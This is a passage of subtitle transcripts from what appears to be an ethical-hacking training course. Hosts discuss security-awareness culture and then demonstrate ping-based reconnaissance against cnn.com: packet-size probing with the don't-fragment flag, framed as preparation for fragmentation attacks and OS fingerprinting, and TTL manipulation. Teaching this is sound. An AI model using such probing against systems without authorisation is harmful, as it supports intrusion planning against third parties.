thing.\n\n692\n00:31:41.010 --> 00:31:42.990\n>> It's good training and\ngood security awareness.\n\n693\n00:31:42.990 --> 00:31:44.030\n>> That's awesome.\n\n694\n00:31:44.030 --> 00:31:46.010\nI mean, that's the kind of thing\nI love to see, and unfortunately,\n\n695\n00:31:46.010 --> 00:31:48.040\nI don't see that very much,\nthat's the problem.\n\n696\n00:31:48.040 --> 00:31:51.450\nI see a lot of people just working\non their own machines connected\n\n697\n00:31:51.450 --> 00:31:53.000\nto a corporate LAN or whatever.\n\n698\n00:31:53.000 --> 00:31:54.900\nAnd they're not thinking about this stuff.\n\n699\n00:31:54.900 --> 00:31:58.045\nAnd I could footprint and\nrecon just by walking around my classroom.\n\n700\n00:31:58.045 --> 00:31:59.523\n>> [LAUGH]\n>> I mean, a lot of the time.\n\n701\n00:31:59.523 --> 00:32:01.300\nI mean,\nI don't need to work real hard at it.\n\n702\n00:32:01.300 --> 00:32:03.850\n>> They leave themselves

Right?\n\n707\n00:32:10.330 --> 00:32:11.431\nWell, I just stick it.\n\n708\n00:32:11.431 --> 00:32:12.712\n>> [LAUGH]\n>> I don't know if it's too much work.\n\n709\n00:32:12.712 --> 00:32:17.181\nI think it's just honestly,\nthese are people that should know better.\n\n710\n00:32:17.181 --> 00:32:20.900\nI just think honestly, it's a lack of\nsecurity culture in the organization.\n\n711\n00:32:20.900 --> 00:32:25.320\nA lack of formal awareness and\nreinforcement of that thought process\n\n712\n00:32:25.320 --> 00:32:30.420\nthat anywhere they go and anything\nthey do may lead to compromise, right?\n\n713\n00:32:30.420 --> 00:32:33.730\nI mean listen, you're in a class, you're\nin an environment where you've paid money,\n\n714\n00:32:33.730 --> 00:32:35.970\nlet's just be brutally honest,\nto go and learn.\n\n715\n00:32:35.970 --> 00:32:38.400\nYou're not thinking somebody's\ngonna hack you there, I get that.\n\n716\n00:32:38.400 --> 00:32:40.030\nI understand you let down your guard.\n\n717\n00:32:40.030 --> 00:32:42.370\nBut the reality is you\ndon't know who I am.\n\n718\n00:32:42.370 --> 00:32:43.730\nAnd you don't know what I do for a living.\n\n719\n00:32:43.730 --> 00:32:46.265\nAnd this is what I do for\na living, by the way, right?\n\n720\n00:32:46.265 --> 00:32:48.380\n>> [LAUGH]\n>> This exact thing is what I

00:32:58.280\nBut if the evil me shows up\nto teach that day, right?\n\n724\n00:32:58.280 --> 00:33:03.050\nMy evil twin Skippy, if he shows up\nto teach, you got a problem, right?\n\n725\n00:33:03.050 --> 00:33:04.220\nAnd that's an issue.\n\n726\n00:33:04.220 --> 00:33:07.720\nAnd just because you're in an environment\nwhere you think you're okay,\n\n727\n00:33:07.720 --> 00:33:08.825\nyou don't know.\n\n728\n00:33:08.825 --> 00:33:10.855\nAnd you should never let down your guard.\n\n729\n00:33:10.855 --> 00:33:14.995\nAs a certified ethical hacker, the most\nimportant thing you can do is reinforce in\n\n730\n00:33:14.995 --> 00:33:18.035\neverybody's mind in your organization\nthat they're never secure enough.\n\n731\n00:33:18.035 --> 00:33:21.520\nAnd that they never ever\ncan do enough to be secure.\n\n732\n00:33:21.520 --> 00:33:24.050\nAnd they should always do\neverything you tell them to do\n\n733\n00:33:24.050 -->

00:33:30.270\nthey should report it immediately.\n\n736\n00:33:30.270 --> 00:33:32.180\nLet the experts figure it out.\n\n737\n00:33:32.180 --> 00:33:35.140\nWe don't need them to go out and figure\nout whether or not that's the bad person\n\n738\n00:33:35.140 --> 00:33:38.273\nknocking on the door and they open it\nup like in the horror movie, right?\n\n739\n00:33:38.273 -->

girl.\n\n746\n00:33:51.980 --> 00:33:54.780\nYou don't want to be that guy or\nthat girl, because you know\n\n747\n00:33:54.780 --> 00:33:57.750\nthat the minute you open that door the\nmonster's on the other side waiting for\n\n748\n00:33:57.750 --> 00:34:00.210\nyou, right, and\nit's just a matter of time.\n\n749\n00:34:00.210 --> 00:34:03.100\nI call it the stupid person\nhypothesis when I watch movies with\n\n750\n00:34:03.100 --> 00:34:03.810\nmy kids or my wife.\n\n751\n00:34:03.810 --> 00:34:05.730\nI'm like, who's the stupid person, right?\n\n752\n00:34:05.730 --> 00:34:09.390\nWho's gonna open the door when they hear\nthe noise and go, is anybody out there?\n\n753\n00:34:09.390 --> 00:34:10.810\nIs that a monster?\n\n754\n00:34:10.810 --> 00:34:11.490\nWho are you?\n\n755\n00:34:11.490 --> 00:34:13.290\nRight?\nIf you hear a noise in the dark,\n\n756\n00:34:13.290 --> 00:34:14.790\nscary house, guess what?\n\n757\n00:34:14.790 --> 00:34:15.690\nYou get out.\n\n758\n00:34:15.690 --> 00:34:16.350\nLeave.\n\n759\n00:34:16.350 --> 00:34:18.970\nBecause it wouldn't be\na movie if they left.\n\n760\n00:34:18.970 --> 00:34:21.200\nI understand the fact you have\nto stay there to have the movie.\n\n761\n00:34:21.200 --> 00:34:24.720\nBut in real world, in the real life,\nthere's still people that stay.\n\n762\n00:34:24.720 --> 00:34:26.240\nThey want to go figure it out.\n\n763\n00:34:26.240 --> 00:34:28.410\nYou should leave quickly, right?\n\n764\n00:34:28.410 --> 00:34:32.170\nLet people with guns who know how to\nhunt ghosts go in and find those things.\n\n765\n00:34:32.170 --> 00:34:33.460\nThat should not be you.\n\n766\n00:34:33.460 --> 00:34:34.230\nRight?\nThe smart\n\n767\n00:34:34.230 --> 00:34:36.550\nperson is the person that runs away.\n\n768\n00:34:36.550 --> 00:34:37.050\n>> Absolutely.\n\n769\n00:34:37.050 --> 00:34:37.670\n>> Very quickly.\n\n770\n00:34:37.670 --> 00:34:38.740\nRight?\nDon't stay there\n\n771\n00:34:38.740 --> 00:34:40.170\ncuz you're not gonna live\nto fight another day.\n\n772\n00:34:40.170 --> 00:34:41.410\nI don't care what they told you.\n\n773\n00:34:41.410 --> 00:34:42.300\nIt's not gonna happen.\n\n774\n00:34:42.300 --> 00:34:43.780\nYou're gonna be the person\nin the red uniform.\n\n775\n00:34:43.780 --> 00:34:47.510\nAnd so you wanna make sure that\nwhen you're an ethical hacker,\n\n776\n00:34:47.510 --> 00:34:51.750\nthe most important thing you can do is\ntell your users not to be heroes, right?\n\n777\n00:34:51.750 --> 00:34:54.330\nThey are not qualified to\nunderstand what's going on,\n\n778\n00:34:54.330 --> 00:34:56.540\nthey can only mess things up and\nmake it worse.\n\n779\n00:34:56.540 --> 00:34:58.710\nYou need to tell them unequivocally,\n\n780\n00:34:58.710 --> 00:35:02.650\nthey have to help you to be more\nsecure in the network by telling you.\n\n781\n00:35:02.650 --> 00:35:05.690\nA certified professional who\nhas skills and training and\n\n782\n00:35:05.690 --> 00:35:09.800\nunderstands how to respond\nproperly to let you do your job.\n\n783\n00:35:09.800 --> 00:35:10.650\nThey've done their job.\n\n784\n00:35:10.650 --> 00:35:12.950\nThey've identified something unusual.\n\n785\n00:35:12.950 --> 00:35:14.850\nNow you give them a gold star,\npat them on the head.\n\n786\n00:35:14.850 --> 00:35:15.900\nTell them good job.\n\n787\n00:35:15.900 --> 00:35:17.270\nGet out of the way and\n\n788\n00:35:17.270 --> 00:35:20.440\nnow let somebody who knows what\nthey're doing go take a look, right?\n\n789\n00:35:20.440 --> 00:35:22.860\nBecause that's what's important,\ncuz they're just gonna screw it up.\n\n790\n00:35:22.860 --> 00:35:24.790\nThey're gonna shut the machine off.\n\n791\n00:35:24.790 --> 00:35:27.640\nThey're gonna try to uninstall or\ninstall or who knows what.\n\n792\n00:35:27.640 --> 00:35:28.260\nI got this thing,\n\n793\n00:35:28.260 --> 00:35:30.415\nlet me download this piece of\nsoftware that says it'll remove it.\n\n794\n00:35:30.415 --> 00:35:32.520\n>> [LAUGH]\n>> Yeah, let me make it worse for you.\n\n795\n00:35:32.520 --> 00:35:34.280\nThat's what you're gonna do, right?\n\n796\n00:35:34.280 --> 00:35:36.380\nNo, we don't wanna have those people.\n\n797\n00:35:36.380 --> 00:35:39.440\nSo you've gotta really be focused\non education and awareness and\n\n798\n00:35:39.440 --> 00:35:44.230\ncreation of a security culture in\nthe organization that helps you to combat\n\n799\n00:35:44.230 --> 00:35:45.450\nthese behaviors, right?\n\n800\n00:35:45.450 --> 00:35:48.510\nIt's very important for you and when we\nthink about thinks like footprinting and\n\n801\n00:35:48.510 --> 00:35:53.220\nreconnaissance, we're thinking about\ntaking advantage of those areas and\n\n802\n00:35:53.220 --> 00:35:57.360\nfinding information in those systems\nthat have not been effectively scrubbed,\n\n803\n00:35:57.360 --> 00:36:00.510\nbecause people don't know and\nare not aware of how to behave.\n\n804\n00:36:00.510 --> 00:36:04.060\nThe best defense you can have with regards\nto footprinting and reconnaissance,\n\n805\n00:36:04.060 --> 00:36:07.370\nis great security awareness training and\na culture of security.\n\n806\n00:36:07.370 --> 00:36:09.070\nIf you can achieve that,\n\n807\n00:36:09.070 --> 00:36:12.640\nmost of the information we talk about\nthat is potentially problematic,\n\n808\n00:36:12.640 --> 00:36:16.160\nthat is left out there, will be removed\nand/or will be dealt with in such a way\n\n809\n00:36:16.160 --> 00:36:19.710\nthat it becomes almost ineffective for\nthe hacker to gain access to.\n\n810\n00:36:19.710 --> 00:36:23.180\nIt's great if I can go dump your\nDNS registration information.\n\n811\n00:36:23.180 --> 00:36:26.190\nIt's even better if I can get\nyou to do a zone transfer.\n\n812\n00:36:26.190 --> 00:36:29.170\nBut if I can get that zone transfer,\nit's not very effective for\n\n813\n00:36:29.170 --> 00:36:30.580\nme, as was shown to you, right?\n\n814\n00:36:30.580 --> 00:36:33.170\nI mean, it's good to know you've\ngot four DNS servers out there but\n\n815\n00:36:33.170 --> 00:36:35.772\nit's irrelevant if I can't get the zone\ninformation out of any of them.\n\n816\n00:36:35.772 --> 00:36:39.790\nAnd if you've added DNS sets, that we\ncan validate registration records and\n\n817\n00:36:39.790 --> 00:36:42.570\nensure they're coming from\nauthorized individuals or entities.\n\n818\n00:36:42.570 --> 00:36:46.290\nThen there's really not a hope\nthat I can gain access through, or\n\n819\n00:36:46.290 --> 00:36:49.730\nget into as hacker, it's gonna hard for\nme to use that against you in other words.\n\n820\n00:36:49.730 --> 00:36:51.482\nPlain old-fashioned common sense and\n\n821\n00:36:51.482 --> 00:36:55.110\nbest practices in other words tend to be\nthe best approach, more often than not.\n\n822\n00:36:55.110 --> 00:36:55.830\n>> Very true.\n\n823\n00:36:55.830 --> 00:36:58.480\nAlright, words of wisdom\nto live by here from Adam.\n\n824\n00:36:58.480 --> 00:37:02.140\nI get a really good look at footprinting\nor at least the beginnings of footprinting\n\n825\n00:37:02.140 --> 00:37:05.625\nand reconnaissance, and then we've got\nmore to go over, more to talk about.\n\n826\n00:37:05.625 --> 00:37:07.735\n>> Just a wee bit\n>> Yeah, just a little bit,\n\n827\n00:37:07.735 --> 00:37:10.220\nbut unfortunately we're out of time for\nthis particular episode.\n\n828\n00:37:10.220 --> 00:37:11.260\nSo we're gonna hold off.\n\n829\n00:37:11.260 --> 00:37:15.710\nWe'll come back and do another part, take\na closer look at some of the tools and\n\n830\n00:37:15.710 --> 00:37:18.990\ntechniques we can use, actually, perform\nthe footprinting and reconnaissance.\n\n831\n00:37:18.990 --> 00:37:21.690\nSo, I hope everybody out there\nenjoyed watching this one.\n\n832\n00:37:21.690 --> 00:37:24.560\nSigning off for ITProTV,\nI've been your host Mike Rodrick.\n\n833\n00:37:24.560 --> 00:37:25.570\n>> I'm Adam Gordon.\n\n834\n00:37:25.570 --> 00:37:27.804\n>> And we'll see you next time.\n\n835\n00:37:27.804 --> 00:37:35.960\n[SOUND]\n\n",

00:00:19.880\nI'm your host Mike Rodrick, and\ntoday we're doing CEH version 9.\n\n4\n00:00:19.880 --> 00:00:21.050\nAnd specifically in this episode,\n\n5\n00:00:21.050 --> 00:00:25.100\nwe're continuing our conversation\non footprinting and reconnaissance.\n\n6\n00:00:25.100 --> 00:00:27.040\nWe've already done a little\nbit of lecture on it,\n\n7\n00:00:27.040 --> 00:00:30.760\nnow we're gonna actually take a look\nat putting those skills to work.\n\n8\n00:00:30.760 --> 00:00:32.860\nAnd here to help us with that is Mr.\nAdam Gordon.\n\n9\n00:00:32.860 --> 00:00:34.150\nHow you doing, Adam?\n\n10\n00:00:34.150 --> 00:00:35.800\n>> Good, good.\nHow's everybody out there doing?\n\n11\n00:00:35.800 --> 00:00:36.810\nHopefully well.\n\n12\n00:00:36.810 --> 00:00:38.810\nWe're gonna spend some\ntime taking a look at,\n\n13\n00:00:38.810 --> 00:00:41.610\nas Mike said, how to actually put\nsome of these skills to practice.\n\n14\n00:00:41.610 --> 00:00:42.700\nIt's good to talk about, right?\n\n15\n00:00:42.700 --> 00:00:44.450\nNever get me wrong,\nit's always good to talk.\n\n16\n00:00:44.450 --> 00:00:48.078\nBut the reality is that talking by\nitself doesn't get the job done, right?\n\n17\n00:00:48.078 --> 00:00:50.018\nWe gotta actually see it happen.\n\n18\n00:00:50.018 --> 00:00:52.969\nSo what we're gonna do is\ntransport you to a magical,\n\n19\n00:00:52.969 --> 00:00:55.284\nmythical place called virtual reality.\n\n20\n00:00:55.284 --> 00:00:58.221\n>> [LAUGH]\n>> We're gonna go over here to my lab\n\n21\n00:00:58.221 --> 00:00:58.790\nmachine.\n\n22\n00:00:58.790 --> 00:01:01.490\nWe're gonna take a look at some\nways we could apply this knowledge.\n\n23\n00:01:01.490 --> 00:01:04.297\nSo you're gonna see me disappear, boom.\n\n24\n00:01:04.297 --> 00:01:05.296\nLook at, that was awe-\n>> Wow.\n\n25\n00:01:05.296 --> 00:01:06.374\n>> Megan, that is a gold star for you.\n\n26\n00:01:06.374 --> 00:01:08.365\n>> [LAUGH]\n>> That was awesome.\n\n27\n00:01:08.365 --> 00:01:09.708\nAnd so what we're gonna do\nis we're gonna go ahead,\n\n28\n00:01:09.708 --> 00:01:11.030\nwe're gonna take you on\na little guided tour here.\n\n29\n00:01:11.030 --> 00:01:12.930\nSo, we're in a Windows 8.1 machine.\n\n30\n00:01:12.930 --> 00:01:15.320\nWe're running virtual machines\nin the lab environment,\n\n31\n00:01:15.320 --> 00:01:17.410\nas I may have said in one\nof our prior episodes.\n\n32\n00:01:17.410 --> 00:01:20.300\nAnd from time to time,\nwe'll take a tour, we'll go out,\n\n33\n00:01:20.300 --> 00:01:21.980\nwe'll put some of this knowledge to use.\n\n34\n00:01:21.980 --> 00:01:24.920\nWe're gonna open up, as you've already\nseen me do, a command prompt there.\n\n35\n00:01:24.920 --> 00:01:25.880\nIt's running on the screen.\n\n36\n00:01:25.880 --> 00:01:28.100\nNothing fancy,\njust a Windows command prompt.\n\n37\n00:01:28.100 --> 00:01:33.910\nThe only thing I did in Windows, was to\nright-click on the Start icon there and\n\n38\n00:01:33.910 --> 00:01:36.410\njust simply open a Command Prompt\nwith admin permissions.\n\n39\n00:01:36.410 --> 00:01:38.300\nThat way I can do anything I need to do.\n\n40\n00:01:38.300 --> 00:01:42.126\nWe modified the background screen color,\nchanged the font size a little bit.\n\n41\n00:01:42.126 --> 00:01:44.882\nThat way you could see it a little easier,\nbut no difference, everything is normal.\n\n42\n00:01:44.882 --> 00:01:49.110\nAnd all I'm gonna do is just\nstart by going in and pinging.\n\n43\n00:01:49.110 --> 00:01:53.550\nPinging www.cnn.com, right?\n\n44\n00:01:53.550 --> 00:01:58.170\nAnd you can see that I get back\na response, nothing fancy by any means.\n\n45\n00:01:58.170 --> 00:02:00.224\nFour packets out, four packets in.\n\n46\n00:02:00.224 --> 00:02:02.762\nAt least that's how they told me in\nnetworking school it was supposed\n\n47\n00:02:02.762 --> 00:02:03.323\nto work,\n>> [LAUGH]\n\n48\n00:02:03.323 --> 00:02:05.430\n>> And thankfully that is indeed the case.\n\n49\n00:02:05.430 --> 00:02:08.787\nAnd you can see, regardless of\nthe address that we're resolving, CNN,\n\n50\n00:02:08.787 --> 00:02:09.992\ndoesn't really matter.\n\n51\n00:02:09.992 --> 00:02:15.201\nFor now we're just pinging it, that we're\ngetting some basic information back.\n\n52\n00:02:15.201 --> 00:02:19.939\nWe see that from our location we\nare looking at a round-trip time of about\n\n53\n00:02:19.939 --> 00:02:22.572\n25 milliseconds on average,\n>> Not bad.\n\n54\n00:02:22.572 --> 00:02:23.409\n>> Approximately.\n\n55\n00:02:23.409 --> 00:02:27.804\nTTL of 55, and\nwe've got four packets that came back,\n\n56\n00:02:27.804 --> 00:02:32.029\nso we have no packets lost,\npretty straightforward.\n\n57\n00:02:32.029 --> 00:02:35.693\nNow, what we can do with that ping,\naside from doing the obvious

qualified domain name,\n\n60\n00:02:43.157 --> 00:02:45.180\neither way, that's pretty basic.\n\n61\n00:02:45.180 --> 00:02:47.990\nWe can also manipulate the ping sequence,\nand\n\n62\n00:02:47.990 --> 00:02:50.860\nlook at something that may\nstart to be valuable to us.\n\n63\n00:02:50.860 --> 00:02:54.195\nWhat if I told you,\nwhat if I could sell you today?\n\n64\n00:02:54.195 --> 00:02:57.130\n>> [LAUGH]\n>> What if I told you that there was a way\n\n65\n00:02:57.130 --> 00:03:01.900\nthat we could manipulate the ping\nstructure to check for, to probe, to see\n\n66\n00:03:01.900 --> 00:03:06.220\nwhether or not the packet size is of the\nping packets we're about to send out, or\n\n67\n00:03:06.220 --> 00:03:10.950\nany data packet that we're about to send,\nis going to be accepted before we send it.\n\n68\n00:03:10.950 --> 00:03:15.580\nIn other words, could I manipulate\nthe packet size of a transmission\n\n69\n00:03:15.580 --> 00:03:20.480\ncreating a fragmentation, and potentially\nas a result, a fragmentation attack, and\n\n70\n00:03:20.480 --> 00:03:23.570\nknow ahead of time that those\nfragmented packets will get in,\n\n71\n00:03:23.570 --> 00:03:26.650\nbecause I know what the acceptable\nfragment size is of the packet?\n\n72\n00:03:26.650 --> 00:03:28.414\n>> I would be intrigued.\n\n73\n00:03:28.414 --> 00:03:30.327\n>> That would be awesome\nif I could do that.\n\n74\n00:03:30.327 --> 00:03:32.130\n>> [LAUGH]\n>> However, I can't, so\n\n75\n00:03:32.130 --> 00:03:33.370\ninstead, what I'm gonna do.\n\n76\n00:03:33.370 --> 00:03:34.040\nI'm only kidding, right?\n\n77\n00:03:34.040 --> 00:03:34.660\n>> It was a pipe dream.\n\n78\n00:03:34.660 --> 00:03:36.300\n>> It was a set, it was a bad dream.\n\n79\n00:03:36.300 --> 00:03:37.380\nIt actually is possible.\n\n80\n00:03:37.380 --> 00:03:38.600\nLet me show you.\n\n81\n00:03:38.600 --> 00:03:40.300\nLet me show you how we can do this.\n\n82\n00:03:40.300 --> 00:03:43.160\nSo what we can do is the following.\n\n83\n00:03:43.160 --> 00:03:45.140\nWe're gonna go out again, pick our target.\n\n84\n00:03:45.140 --> 00:03:46.780\nWe're just using cnn.com.\n\n85\n00:03:46.780 --> 00:03:50.090\nIt's a publicly accessible website,\nit responds to the ping.\n\n86\n00:03:50.090 --> 00:03:53.420\nLet me be clear as a disclaimer before\nI do this, all kidding aside, and\n\n87\n00:03:53.420 --> 00:03:56.740\nI will give you this disclaimer at\nvarious points during our demos.\n\n88\n00:03:56.740 --> 00:03:59.570\nI am not gonna do anything to\nthis website that in any way will\n\n89\n00:03:59.570 --> 00:04:01.140\naffect its performance.\n\n90\n00:04:01.140 --> 00:04:02.492\nI am not gonna hack into it.\n\n91\n00:04:02.492 --> 00:04:07.140\nI am not gonna engage in any activity that\ncould potentially compromise the integrity\n\n92\n00:04:07.140 --> 00:04:10.880\nof this website, or\nany website that we demonstrate against,\n\n93\n00:04:10.880 --> 00:04:14.710\nor any system that we demonstrate against,\nunless it is a system that\n\n94\n00:04:14.710 --> 00:04:19.550\nI directly control, in a VM that\nI am controlling, I maintain, and\n\n95\n00:04:19.550 --> 00:04:23.455\nthat I can decide that I will blow up or\nmodify with no consequences.\n\n96\n00:04:23.455 --> 00:04:25.905\nAs a certified ethical hacker\n\n97\n00:04:25.905 --> 00:04:29.810\nyou never take steps against any system\nin production that are not allowed.\n\n98\n00:04:29.810 --> 00:04:32.457\nWe've talked about this before and\nI want you to be clear about that.\n\n99\n00:04:32.457 --> 00:04:34.125\nAll demonstrations we do,\n\n100\n00:04:34.125 --> 00:04:38.730\nif they do involve publicly available\nsites, are done under the strictest of\n\n101\n00:04:38.730 --> 00:04:42.240\ncontrolled conditions to understand\nthat we will never do harm.\n\n102\n00:04:42.240 --> 00:04:46.000\nAnd it's very important for you to realize\nthat as you watch these demos, okay?\n\n103\n00:04:46.000 --> 00:04:48.820\nSo, having said that,\nlet's do the following.\n\n104\n00:04:48.820 --> 00:04:51.820\nSo let's add to this ping\nstatement at the end of it.\n\n105\n00:04:51.820 --> 00:04:56.190\nWe're gonna do a -f, do a -l,\n\n106\n00:04:56.190 --> 00:05:02.050\nand we're gonna put the number 1500 at\nthe end of that statement and hit enter.\n\n107\n00:05:02.050 --> 00:05:07.090\nAnd then you will see that instead of\nactually getting four responses back,\n\n108\n00:05:07.090 --> 00:05:09.190\nI don't actually even send anything.\n\n109\n00:05:09.190 --> 00:05:12.960\nInstead, what I get is,\nPacket needs to be fragmented but DF set.\n\n110\n00:05:12.960 --> 00:05:17.180\nSo what we're seeing is that the packet\nsize is not gonna be supported at 1500\n\n111\n00:05:17.180 --> 00:05:21.790\nbytes and we would have to modify that in\norder to set that, or to understand that.\n\n112\n00:05:21.790 --> 00:05:24.720\nThe frame, in other words,\nis too large to be on the network.\n\n113\n00:05:24.720 --> 00:05:29.110\nWe're not using a frame that is\nsupporting a packet that size.\n\n114\n00:05:29.110 --> 00:05:31.620\nWe have one that's smaller and\nwe would have to know this.\n\n115\n00:05:31.620 --> 00:05:36.920\nNow this varies based on\nthe network I connect to,\n\n116\n00:05:36.920 --> 00:05:39.040\nand the way in which\nthat network is setup.\n\n117\n00:05:39.040 --> 00:05:41.150\nYou may have heard of something\ncalled jumbo frames and\n\n118\n00:05:41.150 --> 00:05:43.270\njumbo frame support for instance.\n\n119\n00:05:43.270 --> 00:05:49.110\nJumbo frames, in certain situations, allow\nus to be able to modify the packet size,\n\n120\n00:05:49.110 --> 00:05:52.530\nthe Ethernet packet, the data frame,\nit's referred to different ways,\n\n121\n00:05:52.530 --> 00:05:58.850\nto essentially take it from a default\nsize up to 9000, and to essentially\n\n122\n00:05:58.850 --> 00:06:03.110\ntransmit six times the normal amount of\ninformation approximately in that packet.\n\n123\n00:06:03.110 --> 00:06:06.755\nNow we have to modify the settings in\nthe network interfaces and the routers,\n\n124\n00:06:06.755 --> 00:06:07.493\nthe switches.\n\n125\n00:06:07.493 --> 00:06:09.563\nThere's a bunch of stuff that has\nto happen to support jumbo frames.\n\n126\n00:06:09.563 --> 00:06:13.999\nBut, if I was dealing with a jumbo\nframe network and I didn't know that,\n\n127\n00:06:13.999 --> 00:06:15.746\nI could fragment packets for\n\n128\n00:06:15.746 --> 00:06:19.478\nan attack at a much larger rate\nin terms of the amount of data.\n\n129\n00:06:19.478 --> 00:06:22.293\nAnd if I didn't set them\nto jumbo frame size,\n\n130\n00:06:22.293 --> 00:06:27.480\nthey would stand out like suspicious sore\nthumbs when they were small at 1500,\n\n131\n00:06:27.480 --> 00:06:30.968\nand I would essentially\nbe exposing my attack.\n\n132\n00:06:30.968 --> 00:06:35.370\n>> Because all that traffic going on that\nnetwork would probably be at 9000 bytes\n\n133\n00:06:35.370 --> 00:06:38.870\ninstead of 1500,\nstandard Ethernet packet size.\n\n134\n00:06:38.870 --> 00:06:41.038\nSo I'd have to probe to\nfind this stuff out.\n\n135\n00:06:41.038 --> 00:06:43.636\nThis is one of the ways that recon and\nfootprinting could be very valuable,\n\n136\n00:06:43.636 --> 00:06:45.050\nbecause we could start to probe and see.\n\n137\n00:06:45.050 --> 00:06:49.030\nSo, if we do this and we say,\n1500 that's not gonna work.\n\n138\n00:06:49.030 --> 00:06:51.466\nLet's go and see if 1437 may work.\n\n139\n00:06:51.466 --> 00:06:56.158\nAnd sure enough I'm able to send that\npacket and 1437 does work, which means\n\n140\n00:06:56.158 --> 00:07:01.070\nthe packet size is somewhere between\n1437 and 1500 and I'm bracketing it.\n\n141\n00:07:01.070 --> 00:07:05.789\nI'm trying to find out where it is and\ntrying to see,\n\n142\n00:07:05.789 --> 00:07:08.590\nright, if I can get out there.\n\n143\n00:07:08.590 --> 00:07:09.988\n1478's too big.\n\n144\n00:07:09.988 --> 00:07:14.380\n>> Mm-hm.\n>> So it's below 1478, but above 1432.\n\n145\n00:07:14.380 --> 00:07:18.155\nAnd again, no packets were ever\nharmed in this presentation.\n\n146\n00:07:18.155 --> 00:07:19.500\n>> [LAUGH]\n>> Right?\n\n147\n00:07:19.500 --> 00:07:21.040\nAll natural, all good for\n\n148\n00:07:21.040 --> 00:07:24.880\nyou, no packets were ever harmed to\nmake you this particular ping solution.\n\n149\n00:07:24.880 --> 00:07:26.990\nSo, I'm bracketing, I'm zeroing in, right?\n\n150\n00:07:26.990 --> 00:07:29.850\n>> You just slowly work your way into,\n>> I just work my way down.\n\n151\n00:07:29.850 --> 00:07:33.473\nI do 56 and see if that one works,\nand I jump from 32 to 56.\n\n152\n00:07:33.473 --> 00:07:38.604\nSo now I know that somewhere between\n1456 and 1478 lies the outer threshold,\n\n153\n00:07:38.604 --> 00:07:42.660\nthe buffer, of that frame size and\nI'm zeroing in.\n\n154\n00:07:42.660 --> 00:07:46.120\nNow, I've got ways to do this a little bit\nquicker when I'm not lecturing to you and\n\n155\n00:07:46.120 --> 00:07:46.871\ndemoing as we go.\n\n156\n00:07:46.871 --> 00:07:50.963\nI have a script I can run that just cycles\nthrough and in about five seconds tells me\n\n157\n00:07:50.963 --> 00:07:54.092\nwhat that is because it's\nan automated script that I can use,\n\n158\n00:07:54.092 --> 00:07:55.677\nthat I've written to do this.\n\n159\n00:07:55.677 --> 00:07:58.150\nBut, Reality is, it's not that hard.\n\n160\n00:07:58.150 --> 00:08:03.190\nAnd the ideas of this activity is gonna\nhelp me to understand ultimately how\n\n161\n00:08:03.190 --> 00:08:08.560\nI can zero-in, so I can see what\nthe maximum frame sizes for this machine.\n\n162\n00:08:08.560 --> 00:08:10.640\nNow that's gonna be helpful because again.\n\n163\n00:08:10.640 --> 00:08:14.810\nAs I do this,\nI'm gonna then be able to understand\n\n164\n00:08:14.810 --> 00:08:19.240\nwhat that frame size is allowing me to\nbetter craft my fragmentation packet.\n\n165\n00:08:19.240 --> 00:08:23.030\nSo I'm gonna execute an attack like\nthat and stay within the frame buffer.\n\n166\n00:08:23.030 --> 00:08:26.330\nSo this is gonna be a very\nimportant skill In reconning.\n\n167\n00:08:26.330 --> 00:08:27.720\nMore reconning than fingerprinting.\n\n168\n00:08:27.720 --> 00:08:29.400\nThis is really more about reconning.\n\n169\n00:08:29.400 --> 00:08:31.400\nBut, fingerprinting plays a part here,\nas well.\n\n170\n00:08:31.400 --> 00:08:34.980\nBecause that frame size can be linked\nback to the operating system running on\n\n171\n00:08:34.980 --> 00:08:36.060\nthe other side.\n\n172\n00:08:36.060 --> 00:08:39.180\nAnd as a result, I can zero in and\nbegin to understand,\n\n173\n00:08:39.180 --> 00:08:41.600\nwhat OS is maybe running\nthat webserver for instance.\n\n174\n00:08:41.600 --> 00:08:42.930\nIs it a Linux box?\n\n175\n00:08:42.930 --> 00:08:44.090\nIs it a Windows box?\n\n176\n00:08:44.090 --> 00:08:46.280\nBased on that frame size,\ni may be able to tell.\n\n177\n00:08:46.280 --> 00:08:49.610\nNow, it's not 100% guaranteed because\nthat frame size can be manipulated.\n\n178\n00:08:49.610 --> 00:08:53.500\nBut its going to zero me in on some\ninformation that can be very valuable.\n\n179\n00:08:53.500 --> 00:08:54.560\n>> Kind of like you said earlier.\n\n180\n00:08:54.560 --> 00:09:00.120\nThat one piece of information\nmight not be helpful by itself but\n\n181\n00:09:00.120 --> 00:09:03.130\nwhen we start aggregating that\ninformation, it can definitely help.\n\n182\n00:09:03.130 --> 00:09:05.430\n>> It can, let me show you another\none that may be of interest,\n\n183\n00:09:05.430 --> 00:09:07.070\nwhich you may not know\nyou can use as well.\n\n184\n00:09:07.070 --> 00:09:09.060\nLet's say instead of doing all that,\n\n185\n00:09:09.060 --> 00:09:14.000\nI wanna manipulate something known as\nthe TTL, the Time To Live variable.\n\n186\n00:09:14.000 --> 00:09:19.130\nThe TTL value, is going to allow me to\n\n187\n00:09:19.130 --> 00:09:22.630\nmodify how long the packets\nstay out on the network.\n\n188\n00:09:22.630 --> 00:09:25.770\nNow, the normal TTL on, is varied, right?\n\n189\n00:09:25.770 --> 00:09:30.650\nIt's gonna depend on a lot of factors\ninvolved the maximum value for\n\n190\n00:09:30.650 --> 00:09:33.150\nit is 255, but we can manipulate that.\n\n191\n00:09:33.150 --> 00:09:37.438\nSo, I may wanna set that to,\nI don't know, something like 3, right.\n\n192\n00:09:37.438 --> 00:09:40.830\nAnd you'll see that when I do that,\nwhat does it say?\n\n193\n00:09:40.830 --> 00:09:43.790\nTTL expired in transmit,\nor transit, rather.\n\n194\n00:09:43.790 --> 00:09:44.560\nWe know that TTL is 55.\n\n195\n00:09:44.560 --> 00:09:46.830\nWe've seen that pretty consistently.\n\n196\n00:09:46.830 --> 00:09:51.990\nMeaning that if I lower it, then\nthe packets are not going to, essentially,\n\n197\n00:09:51.990 --> 00:09:56.190\nget back to me because they expired before\nthey can actually round trip, right?\n\n198\n00:09:56.190 --> 00:09:59.940\nYes, then, this is known as the divide and\nconquer algorithm, absolutely correct.\n\n199\n00:09:59.940 --> 00:10:05.140\nAnd so, we're showing you ways that we\ncan begin to carve up, and really start\n\n200\n00:10:05.140 --> 00:10:10.360\nto understand information in our systems\nin ways that can be valuable to us.\n\n201\n00:10:10.360 --> 00:10:13.970\nAnd if we set the TTL low and\nwe expire it,\n\n202\n00:10:15.170 --> 00:10:19.490\nwe can begin to see where that system\nis how far away it is geographically.\n\n203\n00:10:19.490 --> 00:10:22.670\nAnd am I able to zero in on it and\nfind out how far it 